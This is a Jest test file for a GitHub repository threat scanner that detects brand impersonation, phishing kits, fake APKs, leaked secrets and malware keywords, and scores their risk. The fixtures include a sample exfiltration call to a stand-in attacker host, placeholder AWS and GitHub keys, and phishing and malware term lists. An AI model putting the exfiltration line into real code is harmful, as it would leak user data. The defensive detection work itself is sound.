import { createHash } from 'crypto';
import {
  DetectionEngine,
  IMPERSONATION_ONLY_RULE_IDS,
} from './detection.engine';
import { RiskScoringService } from './risk-scoring.service';
import { RepoAnalysisContext } from './rules/rule.types';
import {
  brandImpersonationRule,
  disposablePhishingRepoRule,
  malwareRule,
  obfuscationRule,
} from './rules/threat.rules';
import { DetectionResult, Severity, ThreatCategory } from '../common/enums';
import { redactSecret, redactSecretsInText } from '../common/utils/redact';

describe('DetectionEngine', () => {
  const engine = new DetectionEngine();

  const baseCtx = (
    overrides: Partial<RepoAnalysisContext> = {},
  ): RepoAnalysisContext => ({
    fullName: 'evil/phonepe-login-apk',
    owner: 'evil',
    name: 'phonepe-login-apk',
    description: 'PhonePe login APK mod cracked wallet',
    topics: ['apk'],
    language: 'Java',
    stars: 0,
    forks: 0,
    isFork: false,
    githubCreatedAt: new Date(),
    filePaths: ['app.apk', 'README.md'],
    readmeText: 'phishing kit for PhonePe login verification',
    smallFileTexts: [],
    matchedBrandName: 'PhonePe',
    matchedBrandAliases: ['phonepe'],
    ...overrides,
  });

  it('detects brand impersonation and fake APK signals', () => {
    const results = engine.analyze(baseCtx());
    const ids = results.map((r) => r.ruleId);
    expect(ids).toEqual(
      expect.arrayContaining([
        'brand-impersonation',
        'fake-apk',
        'phishing-kit',
      ]),
    );
  });

  it('excludes impersonation-only rules (including fake-apk) for an internal audit but keeps content-based ones', () => {
    const results = engine.analyze(baseCtx(), {
      excludeRuleIds: IMPERSONATION_ONLY_RULE_IDS,
    });
    const ids = results.map((r) => r.ruleId);
    expect(ids).not.toContain('brand-impersonation');
    expect(ids).not.toContain('low-reputation-new-repo');
    expect(ids).not.toContain('disposable-phishing-repo');
    // fake-apk can only ever fire alongside a brand match, so it's just as
    // meaningless for an internal audit as brand-impersonation itself.
    expect(ids).not.toContain('fake-apk');
    // Same reasoning as brand-impersonation: "is this a throwaway account"
    // is meaningless against the brand's own confirmed repo/owner.
    expect(ids).not.toContain('suspicious-owner-account');
    // phishing-kit fires here on real phishing terminology in the content
    // ("phishing kit" literally appears in readmeText) - a genuine
    // content-based signal, independent of the brand match, so it's still
    // worth surfacing even against the brand's own confirmed repo.
    expect(ids).toContain('phishing-kit');
  });

  it("reports a hit on the brand's own custom keyword with exact location and text", () => {
    const results = engine.analyze(
      baseCtx({
        matchedBrandKeywords: ['otp bypass', 'nonexistent-keyword'],
        readmeText: 'Tool includes an otp bypass helper for testing.',
      }),
    );
    const hit = results.find((r) => r.ruleId === 'custom-keyword-match');
    expect(hit).toBeDefined();
    expect(hit?.category).toBe(ThreatCategory.CUSTOM_KEYWORD_MATCH);
    expect(hit?.evidence).toContain('otp bypass');
    expect(hit?.evidence).toContain('README');
    expect(hit?.evidence).not.toContain('nonexistent-keyword');
  });

  it('reports up to 20 distinct custom-keyword matches for a large curated keyword list, not just a handful', () => {
    const keywords = Array.from({ length: 30 }, (_, i) => `term${i}`);
    const results = engine.analyze(
      baseCtx({
        matchedBrandKeywords: keywords,
        // Every term0..term29 present in topics, so all 30 would match if
        // there were no cap - readmeText/description are unused here to
        // keep this deterministic and isolated to the topics field.
        topics: keywords,
        readmeText: '',
        description: '',
      }),
    );
    const hits = results.filter((r) => r.ruleId === 'custom-keyword-match');
    expect(hits).toHaveLength(20);
  });

  it("does not double-report a keyword that is just the brand's own name or alias", () => {
    const results = engine.analyze(
      baseCtx({
        // "phonepe" duplicates matchedBrandName ("PhonePe"); "phone pe"
        // duplicates matchedBrandAliases (["phonepe"] here, but exercised
        // via an explicit alias list below); "otp" is a genuinely new term.
        matchedBrandName: 'PhonePe',
        matchedBrandAliases: ['phonepe', 'phone pe'],
        matchedBrandKeywords: ['PhonePe', 'phone pe', 'otp'],
        description: 'PhonePe clone with an otp helper',
      }),
    );
    const hits = results.filter((r) => r.ruleId === 'custom-keyword-match');
    // Only "otp" is new information - the brand-name/alias duplicates are
    // already covered by brand-impersonation's own evidence.
    expect(hits).toHaveLength(1);
    expect(hits[0].evidence).toContain('otp');
  });

  it('reports nothing when every configured keyword is just the brand name/alias', () => {
    const results = engine.analyze(
      baseCtx({
        matchedBrandName: 'PhonePe',
        matchedBrandAliases: ['phonepe'],
        matchedBrandKeywords: ['PhonePe', 'phonepe'],
      }),
    );
    expect(results.some((r) => r.ruleId === 'custom-keyword-match')).toBe(
      false,
    );
  });

  it('reports a case-only duplicate keyword ("zerodha" / "Zerodha") only once, not twice', () => {
    const results = engine.analyze(
      baseCtx({
        matchedBrandKeywords: ['zerodha', 'Zerodha'],
        fullName: 'Eva544/zerodha-frontend',
        name: 'zerodha-frontend',
        description: '',
        readmeText: '',
        topics: [],
      }),
    );
    const hits = results.filter((r) => r.ruleId === 'custom-keyword-match');
    expect(hits).toHaveLength(1);
  });

  it('finds a custom keyword buried outside the sampled files via ctx.keywordFileMatches (full-repo depth)', () => {
    const results = engine.analyze(
      baseCtx({
        matchedBrandKeywords: ['otp bypass'],
        description: '',
        readmeText: '',
        topics: [],
        smallFileTexts: [],
        keywordFileMatches: [
          {
            alias: 'otp bypass',
            path: 'backend/src/deep/nested/auth/module.py',
            lineNumber: 214,
            line: 'def run_otp_bypass_flow(): ...',
          },
        ],
      }),
    );
    const hit = results.find((r) => r.ruleId === 'custom-keyword-match');
    expect(hit).toBeDefined();
    expect(hit?.evidence).toContain('backend/src/deep/nested/auth/module.py');
    expect(hit?.evidence).toContain('214');
  });

  it('does not fire custom-keyword-match when the brand has no keywords configured', () => {
    const results = engine.analyze(baseCtx({ matchedBrandKeywords: [] }));
    expect(results.some((r) => r.ruleId === 'custom-keyword-match')).toBe(
      false,
    );
  });

  it('excludes custom-keyword-match for internal audits, same as other impersonation-only rules', () => {
    const results = engine.analyze(
      baseCtx({ matchedBrandKeywords: ['otp bypass'] }),
      { excludeRuleIds: IMPERSONATION_ONLY_RULE_IDS },
    );
    expect(results.some((r) => r.ruleId === 'custom-keyword-match')).toBe(
      false,
    );
  });

  it('flags a brand-matched repo whose code sends data to an unrelated domain (suspicious-destination)', () => {
    const results = engine.analyze(
      baseCtx({
        smallFileTexts: [
          {
            path: 'src/login.js',
            content:
              'fetch("https://attacker-collect.example.com/steal", data)',
          },
        ],
      }),
    );
    const hit = results.find((r) => r.ruleId === 'suspicious-destination');
    expect(hit).toBeDefined();
    expect(hit?.category).toBe(ThreatCategory.SUSPICIOUS_DESTINATION);
    expect(hit?.evidence).toContain('attacker-collect.example.com');
  });

  it('does not fire suspicious-destination when there is no brand match at all', () => {
    const results = engine.analyze(
      baseCtx({
        matchedBrandName: undefined,
        matchedBrandAliases: undefined,
        smallFileTexts: [
          {
            path: 'src/login.js',
            content: 'fetch("https://somewhere.example.com/x", data)',
          },
        ],
      }),
    );
    expect(results.some((r) => r.ruleId === 'suspicious-destination')).toBe(
      false,
    );
  });

  it('excludes suspicious-destination for internal audits', () => {
    const results = engine.analyze(
      baseCtx({
        smallFileTexts: [
          {
            path: 'src/login.js',
            content:
              'fetch("https://attacker-collect.example.com/steal", data)',
          },
        ],
      }),
      { excludeRuleIds: IMPERSONATION_ONLY_RULE_IDS },
    );
    expect(results.some((r) => r.ruleId === 'suspicious-destination')).toBe(
      false,
    );
  });

  it('flags a brand-matched repo with a deploy config present (deployment-signal)', () => {
    const results = engine.analyze(
      baseCtx({ filePaths: ['app.apk', 'README.md', 'vercel.json'] }),
    );
    const hit = results.find((r) => r.ruleId === 'deployment-signal');
    expect(hit).toBeDefined();
    expect(hit?.evidence).toContain('vercel.json');
  });

  it('does not fire deployment-signal when there is no matching deploy config', () => {
    const results = engine.analyze(
      baseCtx({ filePaths: ['app.apk', 'README.md'] }),
    );
    expect(results.some((r) => r.ruleId === 'deployment-signal')).toBe(false);
  });

  it('does not flag an unrelated repo as a phishing kit for a single generic "login page" mention (regression)', () => {
    // Real report: an unrelated storage/API client repo got flagged as
    // "Phishing Indicators" purely because "login page" appeared somewhere
    // in its README - no brand match, no other phishing term, nothing
    // actually suspicious about it.
    const results = engine.analyze(
      baseCtx({
        matchedBrandName: undefined,
        matchedBrandAliases: undefined,
        description: 'Typed S3-compatible client for Cloudflare R2',
        readmeText:
          'Includes a sample login page component for testing the auth flow.',
        filePaths: ['README.md'],
        topics: [],
      }),
    );
    expect(results.some((r) => r.ruleId === 'phishing-kit')).toBe(false);
  });

  it('still flags "login page" when it co-occurs with a monitored brand', () => {
    const results = engine.analyze(
      baseCtx({
        description: 'PhonePe login page clone',
        readmeText: 'A PhonePe login page for testing',
        filePaths: ['README.md'],
        topics: [],
      }),
    );
    expect(results.some((r) => r.ruleId === 'phishing-kit')).toBe(true);
  });

  describe('suspiciousOwnerAccountRule', () => {
    it('does not fire when no owner-account data was fetched', () => {
      const results = engine.analyze(baseCtx());
      expect(results.some((r) => r.ruleId === 'suspicious-owner-account')).toBe(
        false,
      );
    });

    it('does not fire for an established owner account', () => {
      const results = engine.analyze(
        baseCtx({
          ownerAccountCreatedAt: new Date('2015-01-01'),
          ownerFollowers: 40,
          ownerPublicRepos: 25,
        }),
      );
      expect(results.some((r) => r.ruleId === 'suspicious-owner-account')).toBe(
        false,
      );
    });

    it('fires MEDIUM for a brand-new, zero-follower, single-repo account (both signals)', () => {
      const results = engine.analyze(
        baseCtx({
          ownerAccountCreatedAt: new Date(),
          ownerFollowers: 0,
          ownerPublicRepos: 1,
        }),
      );
      const hit = results.find((r) => r.ruleId === 'suspicious-owner-account');
      expect(hit?.severity).toBe(Severity.MEDIUM);
    });

    it('fires LOW for an established-age account that still has an empty public profile', () => {
      const results = engine.analyze(
        baseCtx({
          ownerAccountCreatedAt: new Date('2015-01-01'),
          ownerFollowers: 0,
          ownerPublicRepos: 0,
        }),
      );
      const hit = results.find((r) => r.ruleId === 'suspicious-owner-account');
      expect(hit?.severity).toBe(Severity.LOW);
    });

    it('is excluded from internal-audit scans, even with suspicious owner data present', () => {
      const results = engine.analyze(
        baseCtx({
          ownerAccountCreatedAt: new Date(),
          ownerFollowers: 0,
          ownerPublicRepos: 1,
        }),
        { excludeRuleIds: IMPERSONATION_ONLY_RULE_IDS },
      );
      expect(results.some((r) => r.ruleId === 'suspicious-owner-account')).toBe(
        false,
      );
    });
  });

  it('does not flag a trusted-owner repo as a phishing kit just for mentioning the brand near "login"/"verify"', () => {
    // Mirrors what an internal audit of a real fintech's own auth/trading
    // SDK looks like: brand match forced (it's their own repo), "login" and
    // "verify" show up naturally, but no actual phishing terminology.
    const results = engine.analyze(
      baseCtx({
        owner: 'angel-one',
        description: 'Official Java SDK for the Angel One trading API',
        readmeText:
          'Use the login endpoint to authenticate, then verify your session with the TOTP endpoint.',
        filePaths: ['README.md'],
        topics: [],
        stars: 42,
      }),
    );
    expect(results.some((r) => r.ruleId === 'phishing-kit')).toBe(false);
  });

  it('detects AWS and GitHub secrets with redacted evidence', () => {
    const results = engine.analyze(
      baseCtx({
        smallFileTexts: [
          {
            path: '.env',
            content:
              'AWS_KEY=AKIAIOSFODNN7EXAMPLE\nTOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789',
          },
        ],
      }),
    );
    const secrets = results.filter(
      (r) => r.category === ThreatCategory.EXPOSED_SECRET,
    );
    expect(secrets.length).toBeGreaterThan(0);
    for (const s of secrets) {
      expect(s.evidence).toContain('[REDACTED]');
      expect(s.evidence).not.toContain('AKIAIOSFODNN7EXAMPLE');
    }
  });

  it('ignores benign high-star official-looking repos with weak signals', () => {
    const results = engine.analyze(
      baseCtx({
        owner: 'phonepe',
        stars: 5000,
        description: 'PhonePe official SDK samples',
        readmeText: 'Official samples',
        filePaths: ['README.md'],
        topics: [],
      }),
    );
    expect(
      results.every(
        (r) =>
          r.ruleId !== 'brand-impersonation' || r.severity !== Severity.HIGH,
      ),
    ).toBe(true);
  });
});

describe('brandImpersonationRule weak-keyword gating', () => {
  const ctx = (
    overrides: Partial<RepoAnalysisContext> = {},
  ): RepoAnalysisContext => ({
    fullName: 'someone/repo',
    owner: 'someone',
    name: 'repo',
    description: '',
    topics: [],
    language: '',
    stars: 10,
    forks: 1,
    isFork: false,
    filePaths: [],
    readmeText: '',
    smallFileTexts: [],
    matchedBrandName: 'PhonePe',
    matchedBrandAliases: ['phonepe'],
    ...overrides,
  });

  it('flags a brand mention found only deep in a full-repo grep hit, combined with a phishing term on the same line', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({
        // No brand/phishing signal anywhere in metadata - only in a deep-scan hit.
        brandFileMatches: [
          {
            alias: 'phonepe',
            path: 'src/deep/nested/scraper.py',
            lineNumber: 9901,
            line: 'phonepe login verify otp bypass here',
          },
        ],
      }),
    );
    expect(result).not.toBeNull();
  });

  it('flags a brand mention found only in the capped file-content sample (smallFileTexts)', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({
        smallFileTexts: [
          { path: 'app.py', content: 'phonepe login verify otp bypass' },
        ],
      }),
    );
    expect(result).not.toBeNull();
  });

  it('does not flag a brand mention next to a single generic term like "clone"', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({ description: 'PhonePe clone built for learning purposes' }),
    );
    expect(result).toBeNull();
  });

  it('does not flag a brand mention next to a single generic term like "support"', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({ description: 'PhonePe customer support ticket bot' }),
    );
    expect(result).toBeNull();
  });

  it('flags a brand mention with two generic terms together (clone + mod)', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({ description: 'PhonePe clone mod for testing' }),
    );
    expect(result).not.toBeNull();
  });

  it('flags a brand mention next to a single non-generic term like "phishing"', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({ description: 'PhonePe phishing kit source' }),
    );
    expect(result).not.toBeNull();
  });

  it('does not flag a brand mention and a suspicious term found in unrelated, separate locations (regression: "Zerodha" in a blog post, "login"/"mod" elsewhere in unrelated code)', () => {
    // Real report: a personal blog repo got flagged as impersonating a
    // brand purely because the brand name appeared once (e.g. in blog
    // content) and unrelated words "login"/"mod" appeared somewhere else in
    // the repo (a totally normal site login link, "modal"/"model" in
    // component code) - nothing about the repo actually combines the brand
    // with those terms anywhere.
    const result = brandImpersonationRule.evaluate(
      ctx({
        readmeText: 'A personal blog. One post reviews the PhonePe app.',
        smallFileTexts: [
          {
            path: 'app/page.tsx',
            content: 'import { workItems } from "@/lib/work-items"',
          },
          {
            path: 'app/nav.tsx',
            content: 'const modal = <LoginModal onClose={close} />;',
          },
        ],
      }),
    );
    expect(result).toBeNull();
  });

  it('does not treat "mod" inside "modal"/"model" as the suspicious keyword "mod" (word-boundary regression)', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'app/page.tsx',
            content: 'PhonePe checkout modal and data model here, login too',
          },
        ],
      }),
    ) as DetectionResult | null;
    // "login" is a genuine standalone hit on this line; "modal"/"model"
    // must NOT also register as the keyword "mod" just because it's a
    // substring of both words.
    expect(result?.evidence).toContain('terms: login');
    expect(result?.evidence).not.toContain('mod');
  });

  it('sets file/lineNumber to the exact location where brand and suspicious term were found together', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({
        smallFileTexts: [
          {
            path: 'src/scam.ts',
            content: 'const url = "phonepe-login.com"; // fake login page',
          },
        ],
      }),
    ) as DetectionResult | null;
    expect(result?.file).toBe('src/scam.ts');
    expect(result?.lineNumber).toBe(1);
  });

  it('leaves file/lineNumber unset when the co-located match is in repo metadata, not a file', () => {
    const result = brandImpersonationRule.evaluate(
      ctx({ description: 'PhonePe clone mod for testing' }),
    ) as DetectionResult | null;
    expect(result?.file).toBeUndefined();
    expect(result?.lineNumber).toBeUndefined();
  });
});

describe('disposablePhishingRepoRule', () => {
  const disposableCtx = (
    overrides: Partial<RepoAnalysisContext> = {},
  ): RepoAnalysisContext => ({
    fullName: 'evil/phonepe-login-apk',
    owner: 'evil',
    name: 'phonepe-login-apk',
    description: 'PhonePe login APK mod cracked wallet',
    topics: ['apk'],
    language: 'Java',
    stars: 0,
    forks: 0,
    isFork: false,
    githubCreatedAt: new Date(),
    filePaths: ['app.apk', 'README.md'],
    readmeText: 'phishing kit for PhonePe login verification',
    smallFileTexts: [],
    matchedBrandName: 'PhonePe',
    matchedBrandAliases: ['phonepe'],
    ...overrides,
  });

  it('fires for a brand-new, zero-activity repo with an intent signal and brand match', () => {
    const result = disposablePhishingRepoRule.evaluate(disposableCtx());
    expect(result).not.toBeNull();
    expect(result).toMatchObject({ ruleId: 'disposable-phishing-repo' });
  });

  it('does not fire without a brand match', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({
        matchedBrandName: undefined,
        matchedBrandAliases: undefined,
      }),
    );
    expect(result).toBeNull();
  });

  it('does not fire when the repo has any stars', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({ stars: 1 }),
    );
    expect(result).toBeNull();
  });

  it('does not fire when the repo has any forks', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({ forks: 1 }),
    );
    expect(result).toBeNull();
  });

  it('does not fire for a fork, even a disposable-looking one', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({ isFork: true }),
    );
    expect(result).toBeNull();
  });

  it('does not fire when the repo is older than 14 days', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({
        githubCreatedAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000),
      }),
    );
    expect(result).toBeNull();
  });

  it('does not fire on a brand match with no phishing/apk/impersonation signal', () => {
    const result = disposablePhishingRepoRule.evaluate(
      disposableCtx({
        fullName: 'someone/phonepe-utils',
        name: 'phonepe-utils',
        description: 'PhonePe',
        readmeText: 'A tool related to PhonePe',
        topics: [],
        filePaths: ['README.md'],
      }),
    );
    expect(result).toBeNull();
  });
});

describe('RiskScoringService', () => {
  const scoring = new RiskScoringService();
  const engine = new DetectionEngine();

  it('scores critical findings in the 85-100 band for strong multi-signal repos', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'evil/phonepe-phishing-apk',
      owner: 'evil',
      name: 'phonepe-phishing-apk',
      description: 'PhonePe phishing login APK malware stealer',
      topics: ['apk', 'phishing'],
      language: 'Java',
      stars: 0,
      forks: 0,
      isFork: false,
      githubCreatedAt: new Date(),
      filePaths: ['payload.apk', 'steal.ps1'],
      readmeText:
        'phishing kit malware keylogger\n-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----',
      smallFileTexts: [
        {
          path: 'keys.env',
          content: 'KEY=AKIAIOSFODNN7EXAMPLE',
        },
      ],
      matchedBrandName: 'PhonePe',
      matchedBrandAliases: ['phonepe'],
    };
    const detections = engine.analyze(ctx);
    const risk = scoring.calculate(detections, ctx);
    expect(risk.score).toBeGreaterThanOrEqual(65);
    expect([Severity.HIGH, Severity.CRITICAL]).toContain(risk.severity);
    expect(risk.breakdown.length).toBeGreaterThan(0);
  });

  it('clamps score between 0 and 100', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'x/y',
      owner: 'x',
      name: 'y',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const risk = scoring.calculate(
      Array.from({ length: 20 }).map(() => ({
        ruleId: 'x',
        ruleName: 'x',
        category: ThreatCategory.MALWARE,
        severity: Severity.CRITICAL,
        confidence: 1,
        evidence: 'e',
        explanation: 'e',
        riskContribution: 40,
      })),
      ctx,
    );
    expect(risk.score).toBeLessThanOrEqual(100);
  });

  it('applies diminishing returns to repeated hits of the same rule so volume alone cannot max the score', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'x/y',
      owner: 'x',
      name: 'y',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    // A dozen occurrences of one weak/moderate-confidence rule (e.g.
    // suspicious-destination at 0.7 confidence) - repeated evidence of the
    // exact same signal, not diverse evidence of different signals.
    const manyWeakRepeats: DetectionResult[] = Array.from({ length: 12 }).map(
      (_, i) => ({
        ruleId: 'suspicious-destination',
        ruleName: 'Suspicious Data Destination',
        category: ThreatCategory.SUSPICIOUS_DESTINATION,
        severity: Severity.HIGH,
        confidence: 0.7,
        evidence: `dest ${i}`,
        explanation: 'e',
        riskContribution: 25,
      }),
    );
    const repeated = scoring.calculate(manyWeakRepeats, ctx);
    expect(repeated.severity).not.toBe(Severity.CRITICAL);

    // A single, unrepeated, high-confidence detection from each of several
    // *different* rules should still add up close to its full linear total -
    // diversity of evidence is not penalized by the same-rule decay.
    const diverseSingles: DetectionResult[] = [
      {
        ruleId: 'secret-aws-access-key',
        ruleName: 'AWS Access Key ID',
        category: ThreatCategory.EXPOSED_SECRET,
        severity: Severity.CRITICAL,
        confidence: 0.95,
        evidence: 'e',
        explanation: 'e',
        riskContribution: 35,
      },
      {
        ruleId: 'phishing-kit',
        ruleName: 'Phishing Indicators',
        category: ThreatCategory.PHISHING,
        severity: Severity.CRITICAL,
        confidence: 0.9,
        evidence: 'e',
        explanation: 'e',
        riskContribution: 35,
      },
    ];
    const diverse = scoring.calculate(diverseSingles, ctx);
    // Each is the only detection for its own ruleId, so neither should be
    // decayed - both get full, undiscounted points from the per-detection
    // formula regardless of what else (diversity/reputation bonuses) also
    // affects the total score.
    expect(
      diverse.breakdown.find((b) => b.factor === 'AWS Access Key ID')?.points,
    ).toBe(34);
    expect(
      diverse.breakdown.find((b) => b.factor === 'Phishing Indicators')?.points,
    ).toBe(33);
  });

  it('does not discount a pure credential-exposure finding for high repo reputation', () => {
    // Regression: a company's own real, popular, established repo is
    // exactly the profile this discount used to apply to - which silently
    // downgraded a genuine leaked secret just because the repo looked
    // legitimate. A real credential leak is equally urgent regardless of
    // stars.
    const ctx: RepoAnalysisContext = {
      fullName: 'angelone/backend-services',
      owner: 'angelone',
      name: 'backend-services',
      description: 'Internal services monorepo',
      topics: [],
      language: 'TypeScript',
      stars: 5000,
      forks: 200,
      isFork: false,
      githubCreatedAt: new Date('2018-01-01'),
      filePaths: ['config/.env'],
      readmeText: '',
      smallFileTexts: [],
    };
    const detections: DetectionResult[] = [
      {
        ruleId: 'secret-aws-key',
        ruleName: 'AWS Access Key',
        category: ThreatCategory.EXPOSED_SECRET,
        severity: Severity.CRITICAL,
        confidence: 0.95,
        evidence: '[REDACTED]',
        explanation: 'AWS access key pattern detected.',
        riskContribution: 40,
      },
    ];
    const risk = scoring.calculate(detections, ctx);
    expect(
      risk.breakdown.some((b) => b.factor === 'High repository reputation'),
    ).toBe(false);
  });

  it('still discounts high repo reputation when a malicious-intent signal is present', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'someone/phonepe-tools',
      owner: 'someone',
      name: 'phonepe-tools',
      description: 'PhonePe official SDK samples',
      topics: [],
      language: 'TypeScript',
      stars: 5000,
      forks: 200,
      isFork: false,
      githubCreatedAt: new Date('2018-01-01'),
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const detections: DetectionResult[] = [
      {
        ruleId: 'brand-impersonation',
        ruleName: 'Brand Impersonation',
        category: ThreatCategory.BRAND_IMPERSONATION,
        severity: Severity.HIGH,
        confidence: 0.8,
        evidence: 'phonepe',
        explanation: 'Brand name match with weak account signal.',
        riskContribution: 25,
      },
    ];
    const risk = scoring.calculate(detections, ctx);
    expect(
      risk.breakdown.some((b) => b.factor === 'High repository reputation'),
    ).toBe(true);
  });

  it('does not discount high stars when the fork ratio looks bought/inflated (regression: stars are not proof of legitimacy)', () => {
    // Same 5000-star repo as above, but only 3 forks - a ~0.06% fork ratio,
    // far below the ~9-24% organic baseline. Buying stars in bulk to launder
    // a scam repo's legitimacy is real and well-documented (~3 cents each);
    // this must NOT get the same reputation discount as genuine popularity.
    const ctx: RepoAnalysisContext = {
      fullName: 'someone/phonepe-tools',
      owner: 'someone',
      name: 'phonepe-tools',
      description: 'PhonePe official SDK samples',
      topics: [],
      language: 'TypeScript',
      stars: 5000,
      forks: 3,
      isFork: false,
      githubCreatedAt: new Date('2018-01-01'),
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const detections: DetectionResult[] = [
      {
        ruleId: 'brand-impersonation',
        ruleName: 'Brand Impersonation',
        category: ThreatCategory.BRAND_IMPERSONATION,
        severity: Severity.HIGH,
        confidence: 0.8,
        evidence: 'phonepe',
        explanation: 'Brand name match with weak account signal.',
        riskContribution: 25,
      },
    ];
    const risk = scoring.calculate(detections, ctx);
    expect(
      risk.breakdown.some((b) => b.factor === 'High repository reputation'),
    ).toBe(false);
    const inflated = risk.breakdown.find(
      (b) => b.factor === 'Possibly inflated stars',
    );
    expect(inflated).toBeDefined();
    expect(inflated?.points).toBeGreaterThan(0);
  });

  it('does not add the very-low-popularity or very-new-repo bonus to a pure credential-exposure finding', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'acme/internal-tool',
      owner: 'acme',
      name: 'internal-tool',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      githubCreatedAt: new Date(),
      filePaths: ['config/.env'],
      readmeText: '',
      smallFileTexts: [],
    };
    const detections: DetectionResult[] = [
      {
        ruleId: 'secret-aws-key',
        ruleName: 'AWS Access Key',
        category: ThreatCategory.EXPOSED_SECRET,
        severity: Severity.CRITICAL,
        confidence: 0.95,
        evidence: '[REDACTED]',
        explanation: 'AWS access key pattern detected.',
        riskContribution: 40,
      },
    ];
    const risk = scoring.calculate(detections, ctx);
    expect(risk.breakdown.some((b) => b.factor === 'Very low popularity')).toBe(
      false,
    );
    expect(risk.breakdown.some((b) => b.factor === 'Very new repository')).toBe(
      false,
    );
  });

  it('adds a distinct "repeat operator pattern" line when an operator context is given', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'evil/acme-login',
      owner: 'evil',
      name: 'acme-login',
      description: 'Acme login clone',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const detections = engine.analyze({
      ...ctx,
      description: 'Acme login phishing clone',
      matchedBrandName: 'Acme',
      matchedBrandAliases: ['acme'],
    });

    const without = scoring.calculate(detections, ctx);
    const withOperator = scoring.calculate(detections, ctx, {
      otherBrandsHit: 2,
    });

    expect(withOperator.score).toBeGreaterThan(without.score);
    expect(
      withOperator.breakdown.some(
        (b) => b.factor === 'Repeat operator pattern',
      ),
    ).toBe(true);
    expect(
      without.breakdown.some((b) => b.factor === 'Repeat operator pattern'),
    ).toBe(false);
  });

  it('does not add the operator-pattern line when otherBrandsHit is zero', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'x/y',
      owner: 'x',
      name: 'y',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const risk = scoring.calculate([], ctx, { otherBrandsHit: 0 });
    expect(
      risk.breakdown.some((b) => b.factor === 'Repeat operator pattern'),
    ).toBe(false);
  });

  it('adds a distinct "linked identities" line when a cross-owner fingerprint match is given', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'x/y',
      owner: 'x',
      name: 'y',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const without = scoring.calculate([], ctx, { otherBrandsHit: 0 });
    const withLink = scoring.calculate([], ctx, {
      otherBrandsHit: 0,
      linkedIdentityOwners: 2,
    });
    expect(withLink.score).toBeGreaterThan(without.score);
    expect(
      withLink.breakdown.some(
        (b) => b.factor === 'Linked to other GitHub identities',
      ),
    ).toBe(true);
    expect(
      without.breakdown.some(
        (b) => b.factor === 'Linked to other GitHub identities',
      ),
    ).toBe(false);
  });

  it('does not add the linked-identities line when linkedIdentityOwners is zero or absent', () => {
    const ctx: RepoAnalysisContext = {
      fullName: 'x/y',
      owner: 'x',
      name: 'y',
      description: '',
      topics: [],
      language: '',
      stars: 0,
      forks: 0,
      isFork: false,
      filePaths: [],
      readmeText: '',
      smallFileTexts: [],
    };
    const risk = scoring.calculate([], ctx, {
      otherBrandsHit: 0,
      linkedIdentityOwners: 0,
    });
    expect(
      risk.breakdown.some(
        (b) => b.factor === 'Linked to other GitHub identities',
      ),
    ).toBe(false);
  });
});

describe('redaction', () => {
  it('redacts AWS keys', () => {
    expect(redactSecretsInText('key AKIAIOSFODNN7EXAMPLE end')).toContain(
      '[REDACTED]',
    );
    expect(redactSecretsInText('key AKIAIOSFODNN7EXAMPLE end')).not.toContain(
      'AKIAIOSFODNN7EXAMPLE',
    );
  });

  it('redacts short secrets safely', () => {
    expect(redactSecret('abcd')).toContain('[REDACTED]');
  });
});

describe('malwareRule weak-term gating', () => {
  const ctx = (
    overrides: Partial<RepoAnalysisContext> = {},
  ): RepoAnalysisContext => ({
    fullName: 'someone/repo',
    owner: 'someone',
    name: 'repo',
    description: '',
    topics: [],
    language: '',
    stars: 10,
    forks: 1,
    isFork: false,
    filePaths: [],
    readmeText: '',
    smallFileTexts: [],
    ...overrides,
  });

  it('does not fire for "obfuscated" alone - common in benign minifier/build-tooling docs', () => {
    const result = malwareRule.evaluate(
      ctx({ readmeText: 'This bundler outputs minified, obfuscated code.' }),
    );
    expect(result).toBeNull();
  });

  it('fires when "obfuscated" co-occurs with a real malware term', () => {
    const result = malwareRule.evaluate(
      ctx({ readmeText: 'obfuscated keylogger payload' }),
    );
    expect(result).not.toBeNull();
  });

  it('still fires for an unambiguous malware term alone', () => {
    const result = malwareRule.evaluate(
      ctx({ readmeText: 'This tool is a ransomware builder.' }),
    );
    expect(result).not.toBeNull();
  });
});

describe('obfuscationRule pattern precision', () => {
  const ctx = (
    overrides: Partial<RepoAnalysisContext> = {},
  ): RepoAnalysisContext => ({
